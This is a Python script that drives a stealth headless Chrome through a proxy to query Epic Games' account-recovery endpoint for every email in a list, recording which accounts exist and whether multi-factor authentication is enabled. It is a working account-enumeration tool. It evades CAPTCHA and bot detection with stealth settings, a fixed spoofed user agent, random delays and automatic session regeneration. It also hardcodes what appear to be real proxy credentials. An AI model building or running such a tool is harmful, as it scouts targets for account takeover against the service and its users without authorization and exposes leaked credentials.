import time
import json
from fake_useragent import UserAgent
import tempfile
import sys
import os
import random

# ==============================================================================
# SCRIPT CONFIGURATION
# ==============================================================================
PROXY_CONFIG = {
    "user": os.environ.get("PROXY_USER", "FFCSEjg822t4ZQxe"),
    "pass": os.environ.get("PROXY_PASS", "oMLjrG7iivzkF1QQ_country-us"),
    "host": os.environ.get("PROXY_HOST", "geo.iproyal.com"),
    "port": int(os.environ.get("PROXY_PORT", 12321))
}
EMAILS_FILE = "emails.txt"
RESULTS_FILE = "results.json"
MIN_DELAY_SECONDS = 2.0
MAX_DELAY_SECONDS = 4.0
# ==============================================================================

# --- Start of Critical Diagnostic and Import Section ---
print("--- Starting Python script execution ---")
print(f"Python executable: {sys.executable}")
print(f"Python version: {sys.version}")
print(f"System Path: {sys.path}")

# Check for Chrome binary before attempting to import Selenium
chrome_path = "/usr/bin/google-chrome-stable"
if not os.path.exists(chrome_path):
    print(f"FATAL: Google Chrome binary not found at {chrome_path}")
    sys.exit(1)
print(f"✓ Google Chrome binary found at {chrome_path}")

try:
    print("--- Attempting to import libraries ---")
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException
    from selenium_stealth import stealth
    print("✓ All libraries imported successfully.")
except ImportError as e:
    print(f"FATAL: A critical library import failed. Error: {e}")
    print("This is the final point of failure. The environment is preventing a library from loading.")
    sys.exit(1)
# --- End of Critical Diagnostic and Import Section ---


def run_browser_session(emails_to_process, all_results, total_emails):
    """
    Manages a single, fully automated headless browser session.
    Returns the number of emails successfully processed.
    """
    driver = None
    session_failed = False
    processed_count = 0

    try:
        print("\n" + "="*70)
        print("INITIALIZING RENDER-COMPATIBLE HEADLESS SESSION...")
        print("="*70)

        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--headless=new')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--window-size=1920,1080')
        
        # Using a fixed, common user agent to reduce variables
        chrome_options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36')
        
        # Add proxy settings directly to Chrome options
        proxy_str = f"{PROXY_CONFIG['host']}:{PROXY_CONFIG['port']}"
        chrome_options.add_argument(f"--proxy-server=socks5://{proxy_str}")

        driver = webdriver.Chrome(options=chrome_options)
        
        # Apply stealth settings to make the browser look more human
        stealth(driver,
                languages=["en-US", "en"],
                vendor="Google Inc.",
                platform="Win32",
                webgl_vendor="Intel Inc.",
                renderer="Intel Iris OpenGL Engine",
                fix_hairline=True,
                )

        target_url = 'https://www.epicgames.com/id/login'
        print(f"Navigating to: {target_url}")
        driver.get(target_url)

        try:
            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "email")))
            print("✓ NO CAPTCHA DETECTED. Session is clean.")
            # Manually inject credentials for proxy if needed (basic auth)
            # This is complex with SOCKS5 and often handled by the proxy argument alone
            # We will proceed assuming the proxy argument is sufficient
            
            xsrf_token = driver.get_cookie('XSRF-TOKEN')['value']
        except TimeoutException:
            print("! CAPTCHA DETECTED. Headless mode failed. This session will be regenerated automatically.")
            return 0, True # Return 0 processed, session failed

        for i, email in enumerate(emails_to_process):
            current_progress = len(all_results) + i + 1
            print(f"\n[Email {current_progress}/{total_emails}] Checking: {email}")
            
            email_encoded = email.replace('@', '%40')
            api_url = f'https://www.epicgames.com/id/api/account/recovery/mfa/eligible/{email_encoded}'
            
            script = f"""
                const response = await fetch('{api_url}', {{
                    "method": "POST",
                    "headers": {{ "Accept": "application/json", "Content-Type": "application/json", "X-XSRF-TOKEN": '{xsrf_token}', "X-Epic-Client-ID": "875a3b57d3a640a6b7f9b4e883463ab4" }},
                    "body": JSON.stringify({{ "email": "{email}" }})
                }});
                return response.json();
            """
            api_result = driver.execute_script(script)

            if 'mfaEligible' not in api_result:
                print(f"-> SESSION ERROR: {api_result.get('errorMessage', str(api_result))}. Regenerating session.")
                session_failed = True
                break
            else:
                print(f"-> Result: {json.dumps(api_result)}")
                all_results.append({"email": email, "result": api_result})
                processed_count += 1
            
            time.sleep(random.uniform(MIN_DELAY_SECONDS, MAX_DELAY_SECONDS))

    except Exception as e:
        print(f"\nA critical error occurred in this session: {e}")
        session_failed = True
        
    finally:
        if driver: driver.quit()
    
    return processed_count, session_failed

def main():
    """Main batch processing manager."""
    if not os.path.exists(EMAILS_FILE):
        print(f"FATAL: '{EMAILS_FILE}' not found. Please create it and add emails."); return
    with open(EMAILS_FILE, 'r') as f:
        master_email_list = [line.strip() for line in f if line.strip()]
    if not master_email_list:
        print(f"FATAL: '{EMAILS_FILE}' is empty."); return

    all_results = []
    total_to_process = len(master_email_list)
    
    while len(all_results) < total_to_process:
        remaining_emails = master_email_list[len(all_results):]
        print("\n" + "#"*70)
        print(f"STARTING BATCH RUN. {len(all_results)} done, {len(remaining_emails)} remaining.")
        print("#"*70)
        
        processed_in_session, session_failed = run_browser_session(remaining_emails, all_results, total_to_process)
        
        if all_results:
            with open(RESULTS_FILE, 'w') as f:
                json.dump(all_results, f, indent=2)
            print(f"Progress for {len(all_results)} emails saved to '{RESULTS_FILE}'.")
        
        if not session_failed and len(all_results) == total_to_process:
            print("\nAll emails processed successfully!")
            break
        
        if session_failed:
            print("Pausing for 15 seconds before starting a new session...")
            time.sleep(15)

if __name__ == '__main__':
    main()
